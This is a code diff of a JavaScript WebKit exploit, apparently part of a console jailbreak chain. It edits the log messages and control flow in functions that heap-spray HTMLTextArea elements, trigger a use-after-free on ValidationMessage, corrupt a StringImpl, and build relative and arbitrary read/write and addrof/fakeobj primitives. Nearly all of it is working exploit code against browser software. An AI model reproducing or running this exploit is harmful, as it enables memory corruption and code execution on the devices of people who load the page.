@@ -35,6 +35,7 @@ var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
 var g_textarea_div_elem = null;
+
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -52,14 +53,14 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("Process -> Succesfully got a relative R/W");
+			debug_log("[+] Succesfully got a relative R/W");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
 
-	debug_log("Process -> Setting up arbitrary R/W");
+	debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
@@ -92,14 +93,14 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("Process -> Testing arbitrary R/W");
+	debug_log("[+] Testing arbitrary R/W");
 
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
-	debug_log("Process -> Succesfully got arbitrary R/W!");
+	debug_log("[+] Succesfully got arbitrary R/W!");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -115,17 +116,15 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	if(localStorage.autoExploit=="true")
-		debug_log("Process -> WebKit Exploit Complete.. Running Kernel Exploit !!");
-	else
-		debug_log("Process -> WebKit Exploit Complete.. Run the Kernel Exploit to Jailbreak !!");
-
+	debug_log("[+] Succesfully got addrof/fakeobj");
+	
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
-		window.postExploit();
+		window.postExploit();	    
+}
 
-}function read(addr, length) {
+function read(addr, length) {
 	for (let i = 0; i < 8; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
@@ -192,14 +191,14 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("Process -> Looking for the smashed StringImpl...");
+	debug_log("[+] Looking for the smashed StringImpl...");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("Process -> StringImpl corrupted successfully");
+			debug_log("[+] StringImpl corrupted successfully");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -208,7 +207,7 @@ function leakJSC() {
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
 
-	debug_log("Process -> Got a relative read");
+	debug_log("[+] Got a relative read");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -285,7 +284,7 @@ function leakJSC() {
 	 * /!\ 
 	 */
 
-	debug_log("Process -> JSArrayBufferView: " + g_jsview_leak);
+	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -325,7 +324,7 @@ function reuseTargetObj() {
 
 	/*
 	 * Free ValidationMessage neighboors.
-	 * SmallLine is freed Process -> SmallPage is cached
+	 * SmallLine is freed -> SmallPage is cached
 	 */
 	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
 		g_frames[i].setAttribute("rows", ',');
@@ -359,15 +358,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("Process -> m_timer: " + g_timer_leak);
-	debug_log("Process -> m_messageHeading: " + g_message_heading_leak);
-	debug_log("Process -> m_messageBody: " + g_message_body_leak);
+	debug_log("[+] m_timer: " + g_timer_leak);
+	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("Process -> Found fake ValidationMessage");
+			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -414,7 +413,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("Process -> Spraying HTMLTextareaElement ...");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
@@ -443,7 +442,7 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	if(localStorage.is75XV2Cached){
+	if(localStorage.isPrbCached){
 		/* Init spray */
 		sprayHTMLTextArea();
 
